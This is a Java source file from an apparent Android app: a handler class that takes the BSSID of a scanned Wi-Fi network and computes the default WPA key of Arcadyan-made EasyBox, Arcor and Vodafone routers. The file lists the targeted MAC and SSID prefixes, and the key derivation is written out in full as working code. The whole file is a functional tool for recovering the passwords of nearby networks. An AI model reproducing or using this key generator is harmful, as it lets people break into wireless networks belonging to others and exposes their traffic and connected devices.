package de.warker.ezwlan.handler;

import android.net.wifi.ScanResult;

public class ArcadyanWlanKeyHandler implements IWlanKeyHandler {
	
	private static final String[] SUPPORTED_MACS = {"00:12:BF",	"00:1A:2A", "00:1D:19", 
													"00:23:08", "00:26:4D",	"1C:C6:3C",	
													"50:7E:5D", "74:31:70",	"7C:4F:B5",	
													"88:25:2C"};
	
	private static final String[] SUPPORTED_SSID = {"easybox", "arcor", "vodafone" }; 

	@Override
	public String[] getSupportedMacs() {
		return SUPPORTED_MACS;
	}

	@Override
	public String getKey(ScanResult sr) {
		// code from Wotan.cc
		String wpaKey = "";
		String mac = HandlerFactory.bssid_helper(sr.BSSID);

		String C1 = ""+ Integer.parseInt(mac.substring(8), 16);

		while (C1.length() < 5) C1 = 0+C1;


		//char S6 = C1.charAt(0);
		char S7 = C1.charAt(1);
		char S8 = C1.charAt(2);
		char S9 = C1.charAt(3);
		char S10 = C1.charAt(4);

		//char M7 = mac.charAt(6);
		//char M8 = mac.charAt(7);
		char M9 = mac.charAt(8);
		char M10 = mac.charAt(9);
		char M11 = mac.charAt(10);
		char M12 = mac.charAt(11);


		String tmpK1 = Integer.toHexString(Character.digit(S7, 16) + Character.digit(S8, 16) + Character.digit(M11, 16) + Character.digit(M12, 16));
		String tmpK2 = Integer.toHexString(Character.digit(M9, 16) + Character.digit(M10, 16) + Character.digit(S9, 16) + Character.digit(S10, 16));

		char K1 = tmpK1.charAt(tmpK1.length() -1);
		char K2 = tmpK2.charAt(tmpK2.length() -1);


		String X1 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(S10, 16));
		String X2 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(S9, 16));
		String X3 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(S8, 16));
		String Y1 = Integer.toHexString(Character.digit(K2, 16) ^ Character.digit(M10, 16));
		String Y2 = Integer.toHexString(Character.digit(K2, 16) ^ Character.digit(M11, 16));
		String Y3 = Integer.toHexString(Character.digit(K2, 16) ^ Character.digit(M12, 16));
		String Z1 = Integer.toHexString(Character.digit(M11, 16) ^ Character.digit(S10, 16));
		String Z2 = Integer.toHexString(Character.digit(M12, 16) ^ Character.digit(S9, 16));
		String Z3 = Integer.toHexString(Character.digit(K1, 16) ^ Character.digit(K2, 16));


		wpaKey = X1+Y1+Z1+X2+Y2+Z2+X3+Y3+Z3;
		//System.out.println("WPA-KEY: "+ wpaKey);


		return wpaKey.toUpperCase();
	}

	@Override
	public boolean gotPossibleKey(ScanResult sr) {
		final String ssid = sr.SSID.toLowerCase();
		for(String ssid_prefix : SUPPORTED_SSID){
			if(ssid.startsWith(ssid_prefix.toLowerCase())){
				return true;
			}
		}
		return false;
	}

}
